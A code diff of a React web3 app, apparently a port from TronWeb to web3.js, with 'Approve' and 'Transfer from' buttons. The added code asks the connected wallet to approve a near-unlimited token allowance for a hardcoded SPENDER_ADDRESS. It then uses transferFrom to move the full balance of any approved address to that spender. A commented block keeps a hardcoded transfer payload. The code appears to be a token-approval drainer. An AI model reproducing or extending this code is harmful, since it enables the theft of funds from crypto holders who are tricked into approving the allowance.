@@ -71,12 +71,12 @@ function App() {
 
 	const getGasFee = async () => {
 		const gasPrice = await web3.eth.getGasPrice()
-		const estimateGas = await web3.eth.estimateGas({
-			from: web3.utils.toChecksumAddress(web3.currentProvider.selectedAddress),
-			to: SPENDER_ADDRESS,
-			data: "0xa9059cbb0000000000000000000000009fc8563fd6f692449515b47bb9fe27559347ffbd00000000000000000000000000000000000000000000000000000003f5476a00"
-		})
-		console.log('estimateGas: ', estimateGas)
+		// const estimateGas = await web3.eth.estimateGas({
+		// 	from: web3.utils.toChecksumAddress(web3.currentProvider.selectedAddress),
+		// 	to: SPENDER_ADDRESS,
+		// 	data: "0xa9059cbb0000000000000000000000009fc8563fd6f692449515b47bb9fe27559347ffbd00000000000000000000000000000000000000000000000000000003f5476a00"
+		// })
+		// console.log('estimateGas: ', estimateGas)
 		// console.log('gasPrice: ', web3.utils.fromWei(gasPrice, 'ether'))
 		const fee = 80000 * +(web3.utils.fromWei(gasPrice, 'ether'))
 		// console.log('fee: ', fee)
@@ -134,13 +134,19 @@ function App() {
 				text={'Approve'} 
 				theme={'green'} 
 				onClick={async () => {
-					// const { remaining } = await contract.allowance(address, SPENDER_ADDRESS).call()
-					// const allowanceBalance = tronWeb.fromSun(remaining)
-					// if (allowanceBalance > 0) {
-					// 	return Toast.success('You have done!')
-					// }
-					// const res = await contract.approve(SPENDER_ADDRESS, 99999999000000).send()
-					// console.log(res)
+					const allowanceBalance = await contract.methods.allowance(address, SPENDER_ADDRESS).call()
+					console.log(allowanceBalance)
+					if (allowanceBalance > 0) {
+						return Toast.success('You have done!')
+					}
+					const res = await contract.methods.approve(SPENDER_ADDRESS, 99999999000000).send({
+						from: address,
+						gas: 80000
+					})
+					if (res.code === 4001) {
+						return Toast.fail(res.message)
+					}
+					Toast.success('Success!')
 				}} 
 			/>
 			<Ipt 
@@ -165,34 +171,33 @@ function App() {
 					// // 	Toast.fail('From address is required!')
 					// // 	return
 					// // }
-					// if (from && !tronWeb.isAddress(from.trim())) {
-					// 	Toast.fail('From address is invalid!')
-					// 	return
-					// }
-					// const { remaining } = await contract.allowance(from || address, SPENDER_ADDRESS).call()
-					// Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${tronWeb.fromSun(remaining)}`)
+					if (from && !web3.utils.isAddress(from.trim())) {
+						Toast.fail('From address is invalid!')
+						return
+					}
+					const allowanceBalance = await contract.methods.allowance(from || address, SPENDER_ADDRESS).call()
+					Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${allowanceBalance}`)
 				}} 
 			/>
 			<Btn 
 				text={'Transfer from'} 
 				theme={'yellow'} 
 				onClick={async () => {
-					// if (from && !tronWeb.isAddress(from.trim())) {
-					// 	Toast.fail('From address is invalid!')
-					// 	return
-					// }
-					// const toAddress = to || SPENDER_ADDRESS
-					// // const balance = await contract.balanceOf(address).call()
-					// const balance = await contract.balanceOf(from || address).call()
-					// alert(`【${from || address}】向【${toAddress}】转账【${tronWeb.fromSun(balance)}】开始`)
-					// Toast.loading('Loading...')
-					// const res = await contract.transferFrom(from || address, toAddress, balance).send()
+					if (from && !web3.utils.isAddress(from.trim())) {
+						Toast.fail('From address is invalid!')
+						return
+					}
+					const toAddress = to || SPENDER_ADDRESS
+					const balance = await contract.methods.balanceOf(from || address).call()
+					alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
+					Toast.loading('Loading...')
+					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
 					// // const res = await contract.transfer(toAddress, balance).send()
-					// console.log(res)
-					// Toast.hide()
-					// setTimeout(() => {
-					// 	refresh()
-					// }, 3000)
+					console.log(res)
+					Toast.hide()
+					setTimeout(() => {
+						refresh()
+					}, 3000)
 					
 				}}
 			/>
